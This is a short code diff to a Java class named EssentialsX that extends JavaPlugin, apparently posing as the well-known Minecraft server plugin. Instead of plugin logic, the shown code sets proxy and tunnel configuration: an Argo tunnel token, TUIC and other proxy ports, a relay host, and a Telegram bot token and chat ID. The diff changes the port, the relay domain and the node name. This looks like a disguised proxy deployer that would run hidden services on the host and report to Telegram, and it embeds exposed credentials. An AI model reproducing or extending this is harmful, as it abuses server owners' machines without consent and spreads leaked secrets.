@@ -83,16 +83,16 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_AUTH", "eyJhIjoiYTBhNGUxYzQwYjBkYTdkODUyNWQ1MjI1YjllMzg0NDYiLCJ0IjoiNjQzMmNlMDMtNDkxOS00NGI5LWJhM2QtYmU4ZDlmMWFkZGJhIiwicyI6IlpqRTBOR0l5WTJZdE5UTmpOeTAwTTJReExXSXdPRGd0TWpVeE1XTTRNamRpTVRnNCJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "");
+        env.put("TUIC_PORT", "25575");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "5848244735");
         env.put("BOT_TOKEN", "7799976927:AAHY1DDudQzUTdwkvTAZ8OAy2zHvULCtTX0");
-        env.put("CFIP", "open.kkkx.pp.ua");
+        env.put("CFIP", "open2.kkkx.pp.ua");
         env.put("CFPORT", "443");
-        env.put("NAME", "MossCloud");
+        env.put("NAME", "MineKeep");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
